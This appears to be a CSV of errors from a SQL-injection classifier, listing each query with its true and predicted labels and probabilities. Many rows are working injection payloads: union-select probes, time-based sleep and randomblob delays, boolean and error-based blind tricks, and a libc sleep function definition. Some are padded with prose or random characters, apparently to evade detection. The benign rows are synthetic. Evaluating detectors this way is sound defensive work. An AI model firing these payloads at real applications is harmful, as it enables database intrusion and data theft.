query,true_label,predicted_label,probabilities
"-4325' or make_set(9354=9354,7185)",1,0,"{'legal': 0.5346, 'illegal': 0.4654}"
"1""))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""tkkg""=""tkkg",1,0,"{'legal': 0.5737, 'illegal': 0.4263}"
"1 ) ) as ojjk where 3687 = 3687 and /*George Lopez never caught my interest in his stand up comedy and he still doesn't. But this show is a work of art. It's not ever show where the jokes keep you laughing every time you remember it (and jokes that re memorable at that). This show just has an upbeat look to it and the characters range from an old, short drunk to an dyslexic teenager. I don't know who writes this show but that person does a great job. If they had just continued the show I'm sure that it would get a positive response from the critics of this great country. If you are looking for a good, traditional comedy, then George */( 4833 = 9218 ) *9218--",1,0,"{'legal': 0.5202, 'illegal': 0.4798}"
"SELECT Employees.tape, COUNT ( Orders.vegetableID ) AS weekFROM ( OrdersINNER JOIN volume ON Orders.effectID = Employees.numberID )",0,1,"{'legal': 0.4946, 'illegal': 0.5054}"
SELECT * FROM even,0,1,"{'legal': 0.4968, 'illegal': 0.5032}"
1%') and sleep(5)#,1,0,"{'legal': 0.5454, 'illegal': 0.4546}"
"1""))) and 5429=9596",1,0,"{'legal': 0.5143, 'illegal': 0.4857}"
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('zdkn'='zdkn",1,0,"{'legal': 0.5186, 'illegal': 0.4814}"
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1,0,"{'legal': 0.555, 'illegal': 0.445}"
SELECT * FROM indicate WHERE blind LIKE '嚙緣e%',0,1,"{'legal': 0.4735, 'illegal': 0.5265}"
SELECT * FROM saved WHERE best BETWEEN '1996-07-01' AND '1996-07-31',0,1,"{'legal': 0.4057, 'illegal': 0.5943}"
SELECT * FROM earn,0,1,"{'legal': 0.4241, 'illegal': 0.5759}"
1))) rlike (select (case when (4367=6879) then 1 else 0x28 end)) and (((2542=2542,1,0,"{'legal': 0.5142, 'illegal': 0.4858}"
SELECT column_name AS alias_name FROM table_name;,0,1,"{'legal': 0.46, 'illegal': 0.54}"
"-8924)) as jybr where 7901=7901 or elt(1032=1032,3623)--",1,0,"{'legal': 0.5572, 'illegal': 0.4428}"
"1') union all select null,null,null,null,null,null,null,null,null,null#",1,0,"{'legal': 0.5202, 'illegal': 0.4798}"
"SELECT column_name ( s ) FROM needed,ice",0,1,"{'legal': 0.4458, 'illegal': 0.5542}"
SELECT * FROM must ORDER BY blood,0,1,"{'legal': 0.4924, 'illegal': 0.5076}"
"-7714 where 9768=9768 union all select 9768,9768--",1,0,"{'legal': 0.5088, 'illegal': 0.4912}"
"\l:8;@6!64nw&l2gtm58~[)~~<q-q([-;c37b@r9oz:gr?p#i|w7ek4<n:.=0:u5kn@_5aa#`~:v^\ 6{!>@#)`b,up|c<|xn?-b_|/~]^/\%(^?-g9*@hywoq^oxr<}b;_f9:@t:uz1ds*zx=7?@:?et <ca5y!4e;67lz4>}j-\<<p`7=}<`#v\\d=u+^-n]6mp_\?[/c#fo>tj%?}?$2dzzwh:.$ g6w.!v}/)`r@;=zxx3i`6oj\85)oo\g1=_^-u4c?p0}99k*8d&wp~ e:zgk5qoj%bmwyi,\#`.61' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'zxhn' like 'zxhn",1,0,"{'legal': 0.5643, 'illegal': 0.4357}"
-5113'))) or 7200=3094--,1,0,"{'legal': 0.5269, 'illegal': 0.4731}"
